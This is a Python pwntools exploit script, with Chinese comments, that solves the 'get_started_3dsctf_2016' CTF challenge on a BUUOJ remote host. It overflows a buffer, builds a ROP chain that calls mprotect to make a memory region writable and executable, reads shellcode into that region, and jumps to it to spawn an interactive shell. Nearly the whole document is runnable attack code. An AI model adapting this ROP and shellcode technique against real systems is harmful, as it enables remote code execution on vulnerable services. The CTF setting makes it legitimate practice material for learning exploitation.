from pwn import *

#io= process('./get_started_3dsctf_2016')
io = remote('node3.buuoj.cn',25488)
elf = ELF('./get_started_3dsctf_2016')

get_flag = 0x80489a0
#通过三个寄存器和ret指令存参数
#0x0806fc30 : pop edx ; pop ecx ; pop ebx ; ret
pop_ret = 0x806fc30
#该函数的作用是可以修改栈的可读可写可执行权限
#mprocet函数的参数有三个
#第一个是修改权限的起始地址
#第二个是修改的空间大小
#第三个是权限的代码0x7是可读可写可执行权限
mprotect = elf.symbols['mprotect']
#需要修改成可读可写可执行权限的地址，由于我们需要将shellcode保存在内存中执行，所以要将它保存在got表中。
start_addr = 0x80eb000
size = 0x1000
wrx = 0x7

#接下来需要将我们写的sehllcode通过read函数读到内存中去
read_addr = elf.symbols['read']
read_avg1=0
read_avg2=start_addr
read_avg3=0x100
#这里利用到了栈迁移的知识，将ebp劫持到了mprotect函数，从而使得执行流开始执行mprotect函数，并将函数的参数用三个寄存器保存起来
payload1=cyclic(0x38)+p32(mprotect)+p32(pop_ret)+p32(start_addr)+p32(size)+p32(wrx)
#利用ret指令将执行流转移到read函数
payload1 +=p32(read_addr)
payload1 +=p32(pop_ret)
payload1 +=p32(read_avg1)
payload1 +=p32(read_avg2)
payload1 +=p32(read_avg3)
payload1 +=p32(start_addr)

shellcode = asm(shellcraft.sh())

io.sendline(payload1)
io.sendline(shellcode)
io.interactive()




